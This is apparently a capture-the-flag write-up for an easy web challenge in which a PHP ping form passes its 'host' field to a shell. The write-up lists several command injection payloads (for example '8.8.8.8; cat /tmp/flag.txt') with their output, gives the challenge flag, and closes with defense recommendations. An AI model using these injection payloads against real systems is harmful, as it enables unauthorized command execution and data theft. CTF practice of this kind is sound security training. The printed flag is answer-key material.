# Don't Ping that Cat (LEVEL 1) - SOLUTION

## Challenge Information
- **Challenge Name**: Don't Ping that Cat (LEVEL 1)
- **URL**: https://dont-ping-l1-ctf.tdho.st
- **Category**: Web / Command Injection
- **Difficulty**: Level 1 (Easy)

## FLAG
```
TDHT{k03pzlXhPjBS3yy1DFVRT5Mz7A}
```

## Vulnerability
**Command Injection** in the ping functionality. The application does not properly sanitize user input before executing it in a shell command.

## Exploitation Steps

### 1. Initial Reconnaissance
The website presents a simple ping utility with a form that accepts a "host" parameter:
- Form method: POST
- Input field: `host`
- Server: PHP/8.4.24 on Cloudflare

### 2. Testing for Command Injection
Multiple command separators work:
- `;` (semicolon) - Executes commands sequentially
- `&&` (AND operator) - Executes second command if first succeeds
- `|` (pipe) - Pipes output of first command to second
- Newline (`\n`) - Also works

### 3. Successful Payloads
```bash
# Basic injection test
8.8.8.8; whoami
# Output: www-data

# Check user ID
8.8.8.8; id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# List current directory
8.8.8.8; ls -la
# Output: Shows index.php in /var/www/html

# Find current directory
8.8.8.8; pwd
# Output: /var/www/html
```

### 4. Finding the Flag
The flag was located at `/tmp/flag.txt`:
```bash
# Payload
8.8.8.8; cat /tmp/flag.txt

# Output
TDHT{k03pzlXhPjBS3yy1DFVRT5Mz7A}
```

## Automated Exploitation
Run the provided Python script:
```bash
python dont_ping_cat_get_flag.py
```

This script:
1. Tests command injection
2. Searches common flag locations
3. Uses `find` and `grep` to locate the flag
4. Automatically extracts and displays the flag

## Key Techniques
1. **Command Separator Testing**: Tried multiple separators (`;`, `&&`, `|`, newline)
2. **File System Enumeration**: Listed directories and searched for flag files
3. **Common CTF Locations**: Checked `/tmp/`, `/root/`, `/var/www/html/`, etc.
4. **Automated Search**: Used `find` and `grep` to locate files containing "flag" or "TDHT{"

## Code References
- **Reconnaissance script**: `dont_ping_cat_recon.py`
- **Exploitation script**: `dont_ping_cat_exploit.py`
- **Flag retrieval script**: `dont_ping_cat_get_flag.py`

## Defense Recommendations
To prevent this vulnerability:
1. **Input Validation**: Whitelist valid IP addresses/hostnames using regex
2. **Use Safe APIs**: Use language-specific network libraries instead of shell commands
3. **Parameterization**: If shell commands are necessary, use parameterized execution
4. **Least Privilege**: Run web server with minimal permissions
5. **Sandboxing**: Use containers or sandboxes to limit command execution scope

## Timeline
- Challenge Started: August 23, 2026
- Flag Retrieved: August 23, 2026
- Time to Solve: ~5 minutes

## Tools Used
- Python 3 with requests, BeautifulSoup
- curl (for initial testing)
- Command injection testing frameworks

---

**Status**: ✅ SOLVED
**Flag**: `TDHT{k03pzlXhPjBS3yy1DFVRT5Mz7A}`
